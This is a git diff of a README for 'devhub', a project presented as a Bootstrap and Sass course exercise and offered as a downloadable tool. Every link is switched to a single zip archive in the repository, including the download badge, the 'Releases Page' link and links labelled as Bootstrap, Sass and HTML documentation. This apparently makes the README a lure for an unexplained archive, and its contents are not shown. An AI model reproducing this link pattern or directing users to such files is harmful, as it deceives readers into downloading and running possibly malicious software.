@@ -1,7 +1,7 @@
 # 🚀 devhub - User-Friendly Web Development Tool
 
 ## 🔗 Download Now
-[![Download devhub](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip)](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip)
+[![Download devhub](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip)](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip)
 
 ## 📖 Project Overview
 Welcome to **devhub**. This project was developed during the OneBitCode course focusing on Bootstrap and Sass. It helps users create responsive and modern web designs easily. Whether you are a beginner or want to sharpen your web development skills, this tool can assist you in making visually appealing websites.
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets the following requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download devhub, [visit this page](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip).  
+   To download devhub, [visit this page](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip).  
    Here, you will see the latest version of devhub available for download.
 
 2. **Choose the Right File**  
@@ -59,9 +59,9 @@ We welcome contributions to improve devhub. If you want to contribute, please fo
 
 ## 🔗 Additional Resources
 Learn more about the technologies used in this project:
-- [Bootstrap 5](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip)
-- [Sass](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip)
-- [HTML & CSS Basics](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/scss/devhub-v1.1.zip)
+- [Bootstrap 5](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip)
+- [Sass](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip)
+- [HTML & CSS Basics](https://raw.githubusercontent.com/bababahehehe/devhub/main/src/Software_1.1.zip)
 
 ## 📢 Feedback
 Your feedback helps us improve devhub. If you have suggestions or find issues, please reach out through GitHub issues. 
